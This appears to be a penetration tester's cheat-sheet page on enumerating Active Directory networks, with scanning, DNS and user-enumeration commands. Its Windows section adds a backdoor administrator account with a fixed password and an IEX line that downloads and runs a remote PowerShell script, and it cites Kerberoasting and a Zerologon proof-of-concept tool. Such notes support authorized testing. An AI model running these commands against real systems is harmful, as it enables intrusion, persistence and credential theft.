---
description: Enumerate the network and its services, find the DC,
---

# Domain Network Enumeration

## Network Enumeration

```bash
nmap -sP -p $ip #ping scan
nmap -Pn -n -T4 -v3 $ip #quick scan
rustscan -a $ip
```

## Domain Name

```bash
nxc smb $network_ip
```

## Domain Controllers

They are usually DNS Servers. They have usually LDAP listening port 389.

<pre class="language-bash"><code class="lang-bash"><strong># with nmap
</strong><strong>nmap -p53,88,389 $network_ip --open -v -oN dc
</strong># with nmcli
nmcli dev show $iface
# with nslookup
nslookup -type=SRV _ldap._tcp.dc.msdcs.$domain
</code></pre>

## Enumerate alive machines

<pre class="language-bash"><code class="lang-bash"><strong># with zmap
</strong><strong>sudo zmap -i $iface -P 2 --probe-module=icmp_echoscan -B 1M --max-targets=10000000 -o targets_rfc1918.txt $network_ips
</strong><strong>
</strong><strong># with arp-scan
</strong>arp-scan -d $networkrange

# with nxc - smb, ssh, rdp
nxc smb $networkrange
</code></pre>

## Enumerate services

### DNS

```bash
# test for dns attacks
dnsenum $domain -f /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt --dnsserver $dns_server_ip > dnsenum.txt

# discover printers, web, shares, vpn, media
gobuster dns -d $domain -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt
```

### Users Enumeration

```bash
# LINUX HOST
# no auth
# netexec
nxc smb $ip -u anonymous -p "" --rid-brute 10000

# kerbrute
kerbrute -domain $domain -dc-ip $ip -users /tools/payloads/SecLists/Usernames/xato-net-10-million-usernames.txt
```

```powershell
# WINDOWS HOST
GetADUsers.py $domain/ -dc-ip $ip

# Get all of the OUs in a domain
Get-ADOrganizationalUnit -Filter 'Name -like "*"' | Format-Table Name, DistinguishedName -A

### Create a new user in admin groupe 

# username:password = anon:p3nT3st!
net user anon p3nT3st! /add
net localgroup administrators anon /add

net user anon p3nT3st! /add;net localgroup administrators anon /add

If you cannot import module start a webserver and
IEX(New-Object Net.Webclient).downloadstring('http://<IP>/Powershell.ps1')
```

## Automatic tools

### AD Enum

* ASREPRoasting
* Kerberoasting
* Dump AD as BloodHound JSON files
* Searching GPOs in SYSVOL for cpassword and decrypting
* Run without creds and attempt to gather for further enumeration during the run
* Sample exploits included:
  * **CVE-2020-1472**

{% embed url="https://github.com/CasperGN/ActiveDirectoryEnumeration" %}

### Install

```bash
pip3 install ActiveDirectoryEnum
python -m ade

# query exploit for poc
python -m ade --exploit cve-2020-1472
```
